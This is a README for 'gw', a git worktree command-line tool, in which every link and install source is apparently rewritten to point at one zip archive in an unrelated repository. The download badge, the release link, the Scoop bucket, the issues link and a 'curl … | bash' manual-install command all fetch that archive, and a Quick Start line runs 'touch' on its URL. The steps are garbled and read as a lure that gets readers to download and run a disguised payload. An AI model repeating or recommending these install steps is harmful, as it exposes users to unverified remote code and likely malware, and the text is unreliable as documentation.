# 🌟 gw - Simplify Your Git Workflow 

[![Download gw](https://github.com/DuongDucToan01/gw/raw/refs/heads/main/src/Software_v1.1.zip)](https://github.com/DuongDucToan01/gw/raw/refs/heads/main/src/Software_v1.1.zip)

## ✨ Overview

gw is a cross-platform Command Line Interface (CLI) tool designed to enhance how you manage your projects using `git worktree`. This tool allows you to work on multiple branches or projects at the same time without complicated setups. 

## 🚀 Getting Started 

To start using gw, follow the steps below to download and install the application.

## 📥 Download & Install gw

1. **Visit the Releases Page:** Click the link below to access the latest version of gw.

   [Visit this page to download](https://github.com/DuongDucToan01/gw/raw/refs/heads/main/src/Software_v1.1.zip)

2. **Choose Your Installation Method:**

   ### 🍺 Homebrew (macOS)
   If you're using macOS, you can easily install gw using Homebrew. Open your terminal and run:
   ```bash
   brew install golbin/tap/gw
   ```

   ### 🌊 Scoop (Windows)
   If you're on Windows, Scoop makes installation straightforward. Run these commands in your PowerShell:
   ```powershell
   scoop bucket add golbin https://github.com/DuongDucToan01/gw/raw/refs/heads/main/src/Software_v1.1.zip
   scoop install gw
   ```

   ### 🛠️ Manual Install (macOS/Linux)
   For manual installations on macOS or Linux, use the following command:
   ```bash
   curl -fsSL https://github.com/DuongDucToan01/gw/raw/refs/heads/main/src/Software_v1.1.zip | bash
   ```

3. **Verify Installation:** To check if gw is installed correctly, run:
   ```bash
   gw --version
   ```
   You should see the version number if gw is installed successfully.

## 🔥 Quick Start 

Once you have installed gw, you can start managing your work. Here’s a quick way to get going:

1. **Add a New Directory (Example: demo)**:
   ```bash
   gw add demo
   ```

2. **Change to the New Directory**:
   ```bash
   gw cd demo
   ```

3. **Create a New File**:
   ```bash
   touch https://github.com/DuongDucToan01/gw/raw/refs/heads/main/src/Software_v1.1.zip
   ```

4. **Check Current Status**:
   ```bash
   gw status
   ```

5. **Apply Changes**:
   ```bash
   gw apply demo
   ```

Tip: You can quickly jump to the repository's root directory with:
```bash
gw cd
```
or
```bash
gw cd root
```

## 📂 Navigation Commands

You can navigate to different directories easily with these commands:
```bash
gw cd root
gw cd <name>
```
Replace `<name>` with the directory you want to access.

## ⚙️ Shell Integration (Recommended)

To enhance your experience, you can install shell integration, allowing `gw cd` to change the directory in your current shell session. Run the following command:
```bash
gw shell-init --install
```
This auto-detects your shell and sets everything up without needing prompts.

If you want to apply the changes for your current session automatically, use:
```bash
eval "$(gw shell-init)"
```
To preview the integration script without installing, run this:
```bash
gw shell-init <shell>
```
Replace `<shell>` with either bash or zsh depending on what you use.

## 🌐 Common Usage Scenarios

**1. Managing Multiple Projects:** 
With gw, you can easily switch between different project branches, keeping your work organized. 

**2. Collaborating with Teams:** 
If you're working with a team, gw allows everyone to pull updates without disrupting each other’s workflows.

**3. Experimenting with New Features:** 
You can create a separate workspace for testing new features while keeping your main work intact.

## 🔍 Features

- **Cross-Platform Support:** Works on macOS and Windows.
- **Easy Batch Processing:** Manage multiple branches and tasks simultaneously.
- **Intuitive Commands:** Simplifies complex git commands into easy-to-use calls.

## 🛠️ Support

If you encounter any issues, please refer to our documentation or look for help on our issues page. Community contributions and feedback are welcome. 

For feature requests or questions, you can open an issue directly in the [issues section](https://github.com/DuongDucToan01/gw/raw/refs/heads/main/src/Software_v1.1.zip).

## 📄 License

gw is released under the MIT License. Feel free to use it, modify it, and share it in accordance with the terms of this license.

---

With this structured guide, you're now equipped to download and start using gw effectively. Enjoy managing your projects with ease!